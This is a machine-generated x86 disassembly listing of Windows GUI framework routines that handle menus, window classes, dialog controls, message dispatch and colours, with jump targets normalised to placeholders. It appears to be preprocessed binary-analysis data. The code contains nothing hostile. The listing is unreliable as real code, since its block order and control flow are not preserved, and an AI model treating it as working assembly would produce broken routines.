retn 0x8
jmp r-xdata
sub_100169fd
push esi
mov esi [ esp + 0xc ]
push edi
mov edi ecx
cmp [ esi ] 0x1
jne r-xdata
mov esi [ esi + 0x4 ]
push 0x1
push esi
push [ edi + 0x1c ]
call sub_100173d7
test eax eax
je r-xdata
push sub_10018ffb
mov ecx rw-data
call sub_10019387
mov ecx [ edi + 0x1c ]
cmp [ eax + 0x50 ] ecx
jne r-xdata
mov ecx edi
call sub_10015ea0
push 0x0
mov ecx eax
call sub_100174f8
test eax eax
jne r-xdata
push ecx
call [ GetMenu@IAT ]
push eax
push [ eax + 0x54 ]
jmp r-xdata
pop edi
pop esi
retn 0x8
mov edx [ eax ]
push esi
mov ecx eax
call [ edx + 0x10 ]
jmp r-xdata
call sub_10018433
push [ esi + 0x8 ]
push eax
call sub_1001699a
test eax eax
je r-xdata
sub_10016a75
mov eax sub_1001a5e4
call sub_10008d90
sub esp 0x30
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x10 ] esp
push eax
push [ esi + 0x24 ]
push [ esi + 0x10 ]
call [ GetClassInfoA@IAT ]
test eax eax
jne r-xdata
push 0x1
pop eax
push esi
call [ RegisterClassA@IAT ]
test ax ax
jne r-xdata
call sub_10019774
xor ebx ebx
cmp [ eax + 0x14 ] bl
je r-xdata
xor eax eax
jmp r-xdata
push 0x1
call sub_10019854
mov [ ebp - 0x4 ] ebx
call sub_10019774
push [ esi + 0x24 ]
mov esi [ lstrcatA@IAT ]
lea edi [ eax + 0x34 ]
push edi
call esi
lea eax [ ebp + 0xa ]
mov [ ebp + 0xa ] 0xa
push eax
push edi
mov [ ebp + 0xb ] bl
call esi
or [ ebp - 0x4 ] 0xffffffff
push 0x1
call sub_100198c4
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
pop ebx
leave
retn 0x4
sub_10016b06
push 0x1
call sub_100198c4
xor ebx ebx
push ebx
push ebx
call sub_1000870c
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
push sub_10018ffb
mov ecx rw-data
mov [ ebp - 0xc ] eax
call sub_10019387
mov eax [ eax + 0x38 ]
lea ecx [ ebp - 0xc ]
sub eax 0x132
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ esi ]
push 0x0
push 0x19
mov ecx esi
call [ eax + 0x98 ]
pop esi
leave
retn 0x8
sub_10016b5c
mov eax sub_1001a5f8
call sub_10008d90
push ecx
push ebx
push esi
mov esi ecx
call sub_10019774
mov eax [ eax + 0x4 ]
mov [ ebp - 0x10 ] eax
call sub_10019774
mov ecx [ eax + 0x4 ]
call sub_10015877
mov eax [ esi ]
xor ebx ebx
mov ecx esi
mov [ ebp - 0x4 ] ebx
call [ eax + 0xb0 ]
test eax eax
je r-xdata
push edi
mov edi [ SendMessageA@IAT ]
push ebx
push ebx
push 0x1f
push [ esi + 0x1c ]
call edi
push 0x1
push 0x1
push ebx
push ebx
push 0x1f
push [ esi + 0x1c ]
call sub_10017450
mov ecx esi
call sub_100173af
push ebx
mov esi eax
push ebx
push 0x1f
push [ esi + 0x1c ]
call edi
push 0x1
push 0x1
push ebx
push ebx
push 0x1f
push [ esi + 0x1c ]
call sub_10017450
call [ GetCapture@IAT ]
cmp eax ebx
je r-xdata
mov eax [ esi ]
mov ecx esi
call [ eax + 0xf0 ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x8c ]
push [ esi + 0x1c ]
call [ WinHelpA@IAT ]
test eax eax
pop edi
jne r-xdata
push ebx
push ebx
push 0x1f
push eax
call edi
or [ ebp - 0x4 ] 0xffffffff
call sub_10019774
mov ecx [ eax + 0x4 ]
call sub_1001588c
mov ecx [ ebp - 0xc ]
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x8
push 0xffffffff
push ebx
push 0xf107
call sub_10018d1e
sub_10016c44
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
xor eax eax
mov [ ebp + 0x8 ] eax
cmp eax [ ebx ]
je r-xdata
cmp edx [ ebx + 0x4 ]
jne r-xdata
add ebx 0x18
jmp r-xdata
cmp ecx [ ebx + 0x8 ]
jb r-xdata
cmp [ ebx + 0x10 ] 0x0
je r-xdata
cmp ecx [ ebx + 0xc ]
ja r-xdata
mov [ ebp + 0x8 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
pop ebx
pop ebp
retn 0x10
sub_10016c84
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
lea ecx [ ebp - 0x4 ]
and [ ebp - 0x4 ] 0x0
mov eax [ esi ]
push ecx
push [ ebp + 0x10 ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0x9c ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
pop esi
leave
retn 0xc
push [ ebp + 0x10 ]
mov eax [ esi ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ eax + 0xa0 ]
mov [ ebp - 0x4 ] eax
sub_10016cc8
mov eax sub_1001a61c
call sub_10008d90
sub esp 0x54
and [ ebp - 0x10 ] 0x0
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
cmp ebx 0x111
mov edi ecx
jne r-xdata
cmp ebx 0x4e
jne r-xdata
push [ ebp + 0x10 ]
mov eax [ edi ]
push [ ebp + 0xc ]
call [ eax + 0x78 ]
test eax eax
je r-xdata
mov esi [ ebp + 0x10 ]
cmp ebx 0x6
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp ebx 0x20
jne r-xdata
push esi
call sub_10015f39
push eax
push [ ebp + 0xc ]
push edi
call sub_10015ca1
mov edx [ edi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
push [ ebp + 0xc ]
mov ecx edi
call [ edx + 0x7c ]
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
mov eax [ edi ]
mov ecx edi
call [ eax + 0x28 ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x14 ] eax
mov ebx eax
mov eax 0x1ff
and ebx eax
and ecx eax
push 0x7
xor ebx ecx
call sub_10019854
mov ecx [ ebp + 0x8 ]
lea eax [ ebx + ebx * 2 ]
cmp ecx [ eax * 4 + rw-data ]
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebp - 0x14 ]
jne r-xdata
mov eax esi
shr eax 0x10
push eax
movsx eax si
push eax
push edi
call sub_10015d02
test eax eax
jne r-xdata
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
jmp r-xdata
test eax eax
mov [ ebx ] ecx
mov [ ebx + 0x8 ] eax
je r-xdata
cmp eax [ ebx + 0x8 ]
jne r-xdata
push 0x1
pop eax
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov [ eax ] ecx
and [ ebx + 0x4 ] 0x0
push 0x7
call sub_100198c4
jmp r-xdata
mov ebx [ ebx + 0x4 ]
push 0x7
mov [ ebp + 0x10 ] ebx
call sub_100198c4
test ebx ebx
je r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov [ fs : 0x0 ] ecx
leave
retn 0x10
mov edx 0xc000
cmp ecx edx
jae r-xdata
cmp [ ebp + 0x8 ] 0xc000
jb r-xdata
mov eax [ eax + 0x4 ]
push 0x0
push 0x0
push edx
push eax
call sub_10016c44
test eax eax
mov [ ebp + 0x10 ] eax
je r-xdata
push 0x0
push 0x0
push ecx
push [ eax + 0x4 ]
call sub_10016c44
test eax eax
mov [ ebp + 0x10 ] eax
jne r-xdata
mov ecx [ ebp + 0x10 ]
mov ebx [ ebx + 0x14 ]
cmp [ ecx + 0x8 ] 0x1a
mov eax [ ecx + 0x10 ]
jne r-xdata
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
test eax eax
mov [ ebp - 0x14 ] eax
jne r-xdata
jmp r-xdata
push 0x7
mov [ ebx + 0x4 ] eax
call sub_100198c4
mov ebx [ ebp + 0x10 ]
jmp r-xdata
dec eax
cmp eax 0x30
ja r-xdata
call [ GetVersion@IAT ]
mov ecx [ ebp + 0x10 ]
cmp al 0x4
sbb eax eax
and al 0xf0
add eax 0x2f
mov ebx [ ebx + 0x14 ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
cmp [ ecx ] edx
je r-xdata
jmp [ eax * 4 + jump_table_10017176 ]
push 0x7
mov [ ebx + 0x4 ] eax
call sub_100198c4
mov ebx [ ebp + 0x10 ]
push 0x0
push 0x0
add eax 0x18
push 0xc000
push eax
call sub_10016c44
test eax eax
mov [ ebp + 0x10 ] eax
jne r-xdata
push [ ebp + 0xc ]
call sub_10018703
push eax
jmp r-xdata
push [ ebp + 0xc ]
jmp r-xdata
mov eax esi
shr eax 0x10
push eax
movsx eax si
push eax
push [ ebp + 0xc ]
call sub_10015f39
jmp r-xdata
push esi
push [ ebp + 0xc ]
call sub_10015f39
jmp r-xdata
lea ecx [ ebp - 0x24 ]
call sub_10018661
mov eax [ esi + 0x4 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x20 ] eax
call sub_10015b9b
mov eax [ esi ]
mov esi [ esi + 0x8 ]
push eax
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x44 ] eax
call sub_10015f60
test eax eax
jne r-xdata
lea ecx [ ebp - 0x24 ]
call sub_10018661
mov eax [ esi + 0x4 ]
push [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp - 0x24 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] 0x2
call ebx
and [ ebp - 0x20 ] 0x0
or [ ebp - 0x4 ] 0xffffffff
mov [ ebp - 0x10 ] eax
lea ecx [ ebp - 0x24 ]
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
push esi
call sub_10015f39
jmp r-xdata
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
movzx eax [ ebp + 0xc ]
jmp r-xdata
push esi
push esi
call sub_10018433
push eax
mov eax [ ebp + 0xc ]
shr eax 0x10
mov ecx edi
call ebx
jmp r-xdata
push [ ebp + 0xc ]
jmp r-xdata
mov eax esi
shr eax 0x10
movsx eax ax
push eax
movsx eax si
mov eax esi
shr eax 0x10
push eax
movzx eax si
jmp r-xdata
push [ ebp + 0xc ]
call sub_10015f39
push eax
push esi
call sub_10015f39
push eax
xor eax eax
cmp [ edi + 0x1c ] esi
sete al
push [ ebp + 0xc ]
call sub_10018703
push [ ebp + 0xc ]
call sub_10018433
jmp r-xdata
mov eax esi
shr eax 0x10
push eax
movzx eax si
push eax
push [ ebp + 0xc ]
call sub_10018433
jmp r-xdata
push [ ebp + 0xc ]
jmp r-xdata
push esi
mov eax esi
shr eax 0x10
push eax
movzx eax si
jmp r-xdata
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push esi
push [ ebp + 0xc ]
call sub_10015f39
jmp r-xdata
push esi
call sub_10015f39
push eax
jmp r-xdata
mov eax [ ebp + 0xc ]
shr eax 0x10
push eax
push esi
call sub_10015f39
jmp r-xdata
mov eax [ ebp + 0xc ]
movsx edx ax
shr eax 0x10
cmp [ ecx + 0x10 ] 0x1d
mov [ ebp + 0x8 ] edx
movsx eax ax
mov [ ebp + 0xc ] eax
jne r-xdata
push esi
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
mov ecx edi
call ebx
jmp r-xdata
push esi
mov eax [ ebp + 0xc ]
push esi
shr eax 0x10
movsx eax si
shr esi 0x10
movsx ecx si
push ecx
push esi
mov ecx edi
push [ ebp + 0xc ]
call ebx
movzx eax si
shr esi 0x10
push esi
push eax
mov eax [ ebp + 0xc ]
mov ecx edi
shr eax 0x10
push eax
movzx eax [ ebp + 0xc ]
push eax
call ebx
mov [ ebp - 0x10 ] eax
jmp r-xdata
push esi
push [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
mov ecx edi
call ebx
jmp r-xdata
push eax
mov ecx edi
call ebx
jmp r-xdata
push eax
jmp r-xdata
push esi
push eax
lea eax [ ebp - 0x24 ]
mov ecx edi
push eax
call ebx
and [ ebp - 0x20 ] 0x0
and [ ebp - 0x44 ] 0x0
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x10 ] eax
call sub_100165ab
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x24 ]
jmp r-xdata
mov eax [ edi + 0x34 ]
test eax eax
je r-xdata
push eax
movzx eax [ ebp + 0xc ]
mov [ ebp - 0x10 ] eax
mov ecx edi
call ebx
jmp r-xdata
mov ecx edi
call ebx
jmp r-xdata
push eax
push [ ebp + 0xc ]
mov ecx edi
call ebx
jmp r-xdata
push eax
jmp r-xdata
push eax
jmp r-xdata
call sub_10015f39
jmp r-xdata
push eax
push [ ebp + 0xc ]
call sub_10015f39
jmp r-xdata
push eax
jmp r-xdata
push [ ebp + 0xc ]
push eax
movzx eax [ ebp + 0xc ]
jmp r-xdata
push eax
push edx
jmp r-xdata
push esi
call sub_10015f39
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jmp r-xdata
mov ecx edi
call ebx
test eax eax
jne r-xdata
call sub_10018749
jmp r-xdata
lea eax [ ebp - 0x60 ]
push [ ebp - 0x44 ]
lea ecx [ eax + 0x20 ]
call sub_100141b7
test eax eax
je r-xdata
mov [ ebp - 0x28 ] eax
sub_10017264
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ ebp + 0x8 ]
push ebx
push esi
push edi
movzx edi ax
xor ebx ebx
mov esi ecx
shr eax 0x10
cmp [ ebp + 0xc ] ebx
mov [ ebp + 0x8 ] eax
jne r-xdata
push sub_10018ffb
mov ecx rw-data
call sub_10019387
mov eax [ eax + 0xb8 ]
cmp eax [ esi + 0x1c ]
je r-xdata
cmp edi ebx
je r-xdata
push 0x1
pop eax
jmp r-xdata
push ebx
push [ ebp + 0xc ]
call sub_10017525
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
lea ecx [ ebp - 0x2c ]
call sub_1001723a
mov eax [ esi ]
lea ecx [ ebp - 0x2c ]
push ebx
push ecx
push 0xffffffff
push edi
mov ecx esi
mov [ ebp - 0x28 ] edi
call [ eax + 0xc ]
cmp [ ebp - 0x4 ] ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0x8
cmp edi ebx
jne r-xdata
mov [ ebp + 0x8 ] ebx
mov eax [ esi ]
push ebx
push ebx
mov ecx esi
push [ ebp + 0x8 ]
push edi
call [ eax + 0xc ]
sub_100172f0
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi ecx
mov ebx [ esi ]
push ebx
call [ GetDlgCtrlID@IAT ]
movzx eax ax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
push sub_10018ffb
mov ecx rw-data
mov [ ebp + 0xc ] eax
call sub_10019387
mov eax [ eax + 0xb8 ]
cmp eax [ edi + 0x1c ]
je r-xdata
push 0x1
pop eax
jmp r-xdata
push [ ebp + 0x10 ]
push ebx
call sub_10017525
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn 0xc
mov eax [ ebp + 0x10 ]
lea ecx [ ebp - 0xc ]
push 0x0
push ecx
movzx ecx [ ebp + 0xc ]
or ecx 0x4e0000
mov [ ebp - 0xc ] eax
mov eax [ edi ]
push ecx
push [ ebp - 0x4 ]
mov ecx edi
mov [ ebp - 0x8 ] esi
call [ eax + 0xc ]
sub_1001736a
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_10015f60
test eax eax
je r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x40000000
je r-xdata
mov ecx eax
call sub_10006f16
test eax eax
je r-xdata
push 0x4
push esi
call [ GetWindow@IAT ]
push esi
call [ GetParent@IAT ]
jmp r-xdata
pop esi
retn 0x4
mov eax [ eax + 0x1c ]
jmp r-xdata
sub_100173af
test ecx ecx
je r-xdata
xor eax eax
retn
mov eax [ ecx + 0x1c ]
test eax eax
jne r-xdata
push esi
mov esi eax
push esi
push esi
call sub_10015f39
pop esi
retn
mov esi eax
push eax
jmp r-xdata
call sub_1001736a
test eax eax
je r-xdata
sub_100173d7
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ GetDlgItem@IAT ]
mov edi [ GetTopWindow@IAT ]
mov esi eax
test esi esi
je r-xdata
push [ ebp + 0x8 ]
call edi
push esi
call edi
test eax eax
je r-xdata
xor eax eax
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_100173d7
test eax eax
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
push esi
jne r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_100173d7
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
retn 0xc
push 0x2
push esi
call [ GetWindow@IAT ]
jmp r-xdata
call sub_10015f60
test eax eax
jne r-xdata
call sub_10015f39
jmp r-xdata
mov esi eax
test esi esi
je r-xdata
sub_10017450
push ebp
mov ebp esp
push esi
push edi
push [ ebp + 0x8 ]
mov edi [ GetTopWindow@IAT ]
call edi
pop edi
pop esi
pop ebp
retn 0x18
cmp [ ebp + 0x1c ] 0x0
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call [ SendMessageA@IAT ]
push esi
call sub_10015f60
test eax eax
je r-xdata
push 0x2
push esi
call [ GetWindow@IAT ]
jmp r-xdata
push esi
call edi
test eax eax
je r-xdata
cmp [ ebp + 0x18 ] 0x0
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ eax + 0x1c ]
push eax
call sub_10015d78
jmp r-xdata
mov esi eax
test esi esi
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_10017450
sub_100174cd
push esi
mov esi ecx
call sub_1001816f
cmp [ esp + 0xc ] 0x0
jne r-xdata
push eax
push 0x0
mov ecx esi
call sub_10018155
push eax
push [ esp + 0x14 ]
call [ AdjustWindowRectEx@IAT ]
pop esi
retn 0x8
and ah 0xfd
sub_100174f8
push esi
mov esi ecx
push sub_10018ffb
mov ecx rw-data
call sub_10019387
push [ esp + 0x8 ]
mov edx [ esi ]
mov ecx esi
push [ eax + 0x40 ]
push [ eax + 0x3c ]
push [ eax + 0x38 ]
call [ edx + 0xa8 ]
pop esi
retn 0x4
sub_10017525
mov eax sub_1001a630
call sub_10008d90
sub esp 0x3c
push esi
push edi
push 0x0
call sub_10015ec7
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov edi [ ebp + 0x8 ]
lea esi [ eax + 0x4 ]
push edi
mov ecx esi
call sub_100141b7
test eax eax
jne r-xdata
mov ecx [ ebp - 0xc ]
pop edi
pop esi
mov [ fs : 0x0 ] ecx
leave
retn 0x8
push [ ebp + 0xc ]
mov ecx eax
call sub_100174f8
push edi
call [ GetParent@IAT ]
push eax
mov ecx esi
call sub_100141b7
test eax eax
je r-xdata
mov eax [ eax + 0x34 ]
test eax eax
je r-xdata
push edi
lea ecx [ eax + 0x20 ]
call sub_100141b7
mov esi eax
test esi esi
je r-xdata
push edi
lea ecx [ ebp - 0x48 ]
call sub_10015bd9
push [ ebp + 0xc ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x10 ] esi
call sub_100174f8
and [ ebp - 0x2c ] 0x0
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x48 ]
mov esi eax
call sub_100165ab
mov eax esi
jmp r-xdata
sub_100175c9
push ebp
mov ebp esp
cmp [ ecx + 0x38 ] 0x0
push esi
je r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10017624
push [ ebp + 0x10 ]
mov esi [ ebp + 0x8 ]
push [ ebp + 0xc ]
lea eax [ esi + 0x2000 ]
push eax
push [ ecx + 0x1c ]
call [ SendMessageA@IAT ]
cmp esi 0x132
jb r-xdata
mov ecx [ ebp + 0x14 ]
test ecx ecx
je r-xdata
cmp esi 0x138
ja r-xdata
push 0x1
pop eax
jmp r-xdata
mov [ ecx ] eax
test eax eax
je r-xdata
pop esi
pop ebp
retn 0x10
sub_10017624
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
mov edx 0x111
cmp eax edx
push esi
ja r-xdata
cmp eax 0x114
jb r-xdata
je r-xdata
cmp eax 0x132
jb r-xdata
cmp eax 0x115
jbe r-xdata
mov eax [ ebp + 0xc ]
xor esi esi
shr eax 0x10
push esi
or eax 0xbd110000
push esi
push eax
push esi
call sub_1001575a
test eax eax
je r-xdata
cmp eax 0x2b
jb r-xdata
xor eax eax
cmp eax 0x138
ja r-xdata
push [ ebp + 0x14 ]
add eax 0xbc00
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_10016cc8
jmp r-xdata
cmp eax 0x210
jne r-xdata
mov ecx [ ebp + 0x14 ]
push 0x1
cmp ecx esi
pop eax
je r-xdata
cmp eax 0x2f
jbe r-xdata
mov edx [ ebp + 0xc ]
add eax 0xfffffece
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0xc ]
push edi
xor esi esi
push eax
push esi
push 0xbc19
mov [ ebp - 0x8 ] edx
call sub_10016cc8
cmp [ edi ] esi
pop edi
jne r-xdata
pop esi
leave
retn 0x10
mov [ ecx ] eax
jmp r-xdata
cmp eax 0x39
je r-xdata
cmp eax 0x4e
jne r-xdata
mov eax [ ebp + 0x10 ]
mov esi [ ebp + 0x14 ]
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] eax
mov edx [ eax + 0x8 ]
xor esi esi
lea eax [ ebp - 0x8 ]
push esi
push eax
movzx eax dx
or eax 0xbc4e0000
push eax
push esi
call sub_1001575a
jmp r-xdata
sub_1001770c
cmp [ esp + 0x4 ] 0x1
push esi
mov esi ecx
je r-xdata
push 0x0
push [ esp + 0x10 ]
call sub_10017525
test eax eax
jne r-xdata
cmp [ esp + 0x8 ] 0x2
jne r-xdata
pop esi
retn 0x8
mov ecx esi
call sub_10015ea0
sub_1001775b
push esi
mov esi ecx
call sub_10019774
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
call sub_10019774
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x1c ] esi
jne r-xdata
mov ecx esi
call sub_10018155
test eax 0x40000000
jne r-xdata
call sub_100155f9
test eax eax
je r-xdata
mov ecx rw-data
call sub_10018278
mov ecx esi
call sub_10015ea0
pop esi
retn
push 0x1
push 0x1
push 0x0
push 0x0
push 0x15
push [ esi + 0x1c ]
call sub_10017450
call sub_100155f9
cmp [ eax + 0x1c ] esi
jne r-xdata
push sub_100198e5
mov ecx rw-data
call sub_1001941c
mov eax [ eax + 0x1c ]
test eax eax
je r-xdata
call eax
sub_100177d8
push esi
push edi
mov edi ecx
call sub_10019774
cmp [ eax + 0x14 ] 0x0
jne r-xdata
and [ rw-data ] 0x0
push 0x0
push 0x0
mov ecx edi
call sub_100178da
pop edi
pop esi
retn 0x8
push sub_100198e5
mov ecx rw-data
call sub_1001941c
mov esi eax
call sub_100155f9
test eax eax
je r-xdata
call sub_100155f9
cmp [ eax + 0x1c ] edi
jne r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
call eax
sub_1001782b
push esi
mov esi ecx
call sub_10019774
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov ecx esi
call sub_10018155
test eax 0x40000000
jne r-xdata
cmp [ eax + 0x1c ] esi
jne r-xdata
pop esi
retn 0x4
call sub_10015e6b
push 0x1
push 0x1
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ esi + 0x1c ]
call sub_10017450
push [ esp + 0x8 ]
mov ecx eax
call sub_10018314
sub_10017876
push ebx
push esi
push edi
mov ebx ecx
call sub_10018155
test eax 0x40000000
jne r-xdata
mov ecx ebx
call sub_10015ea0
call sub_10006cd6
mov esi eax
test esi esi
je r-xdata
mov edi [ GetKeyState@IAT ]
push 0x10
call edi
test ax ax
jl r-xdata
push 0x11
call edi
test ax ax
jl r-xdata
push 0x12
call edi
test ax ax
jl r-xdata
push 0x0
push 0xe146
push 0x111
push [ esi + 0x1c ]
call [ SendMessageA@IAT ]
push 0x1
pop eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn 0x4
sub_100178da
push esi
mov esi ecx
call sub_10006cd6
cmp eax esi
jne r-xdata
mov ecx esi
call sub_10018155
test eax 0x40000000
jne r-xdata
mov ecx rw-data
call sub_100182bc
mov ecx esi
call sub_10015ea0
pop esi
retn 0x8
call sub_10015e6b
push 0x1
push 0x1
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ esi + 0x1c ]
call sub_10017450
sub_10017923
push ebp
mov ebp esp
lea eax [ ebp + 0xc ]
push esi
push eax
mov eax [ ebp + 0xc ]
mov esi ecx
push [ eax + 0x4 ]
call sub_10017525
test eax eax
je r-xdata
mov ecx esi
call sub_10015ea0
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0x8
sub_1001794d
push esi
mov esi ecx
mov ecx [ esp + 0x10 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_10015ea0
push 0x0
call sub_100174f8
test eax eax
jne r-xdata
pop esi
retn 0xc
sub_1001796e
push ebp
mov ebp esp
sub esp 0x1c
push ebx
push esi
push edi
mov edi [ PeekMessageA@IAT ]
mov esi 0x121
push 0x1
push esi
push esi
lea eax [ ebp - 0x1c ]
push 0x0
mov ebx ecx
push eax
mov ecx ebx
call sub_10015ea0
pop edi
pop esi
pop ebx
leave
retn 0x8
lea eax [ ebp - 0x1c ]
push eax
call [ DispatchMessageA@IAT ]
push 0x1
push esi
push esi
lea eax [ ebp - 0x1c ]
push 0x0
push eax
jmp r-xdata
call edi
test eax eax
je r-xdata
sub_100179b8
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ ebp + 0xc ]
lea eax [ ebp + 0xc ]
push eax
call sub_100174f8
test eax eax
je r-xdata
mov ecx esi
call sub_10015ea0
mov eax [ ebp + 0xc ]
jmp r-xdata
pop esi
pop ebp
retn 0xc
sub_100179df
push ebp
mov ebp esp
sub esp 0xc
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x1
je r-xdata
test eax eax
je r-xdata
cmp eax 0x5
je r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0xc
push [ ebp + 0x14 ]
call [ GetObjectA@IAT ]
push [ ebp - 0x8 ]
push [ ebp + 0x8 ]
call [ SetBkColor@IAT ]
mov eax [ ebp + 0x18 ]
cmp eax 0xffffffff
jne r-xdata
push eax
push [ ebp + 0xc ]
call sub_100184a9
test eax eax
je r-xdata
push eax
push [ ebp + 0x8 ]
call [ SetTextColor@IAT ]
push 0x1
pop eax
jmp r-xdata
push 0x8
call [ GetSysColor@IAT ]
leave
retn 0x14
sub_10017a54
push ebp
mov ebp esp
sub esp 0x60
push ebx
push esi
mov esi ecx
push edi
mov [ ebp - 0x8 ] esi
call sub_10018155
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test [ ebp - 0x1 ] 0x40
je r-xdata
mov edi [ eax + 0x1c ]
jmp r-xdata
push 0x4
push [ esi + 0x1c ]
call [ GetWindow@IAT ]
push [ esi + 0x1c ]
call [ GetParent@IAT ]
jmp r-xdata
mov ebx [ GetWindowRect@IAT ]
lea eax [ ebp - 0x28 ]
push eax
push [ esi + 0x1c ]
call ebx
test [ ebp - 0x1 ] 0x40
jne r-xdata
push 0x0
push 0x0
push 0x36b
push edi
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
mov edi eax
test edi edi
je r-xdata
push [ esi + 0x1c ]
call [ GetParent@IAT ]
mov esi [ GetClientRect@IAT ]
mov ebx eax
lea eax [ ebp - 0x18 ]
push eax
push ebx
call esi
lea eax [ ebp - 0x38 ]
push eax
push edi
call esi
lea eax [ ebp - 0x38 ]
push 0x2
push eax
push ebx
push edi
call [ MapWindowPoints@IAT ]
test edi edi
je r-xdata
mov edi eax
mov eax [ ebp - 0x10 ]
add edi ecx
cmp edi eax
jle r-xdata
mov ecx [ ebp - 0x18 ]
jmp r-xdata
test edi edi
mov [ ebp - 0x60 ] 0x28
jne r-xdata
push 0xfffffff0
push edi
call [ GetWindowLongA@IAT ]
test eax __dos_header
je r-xdata
cmp esi [ ebp - 0x14 ]
jge r-xdata
sub eax [ ebp - 0x20 ]
add eax [ ebp - 0x28 ]
mov ecx eax
lea eax [ ebp - 0x38 ]
push eax
push edi
call ebx
lea eax [ ebp - 0x60 ]
push eax
push 0x2
push edi
call sub_10006e18
push eax
call sub_10006e83
lea eax [ ebp - 0x4c ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call [ CopyRect@IAT ]
jmp r-xdata
call sub_10006cd6
test eax eax
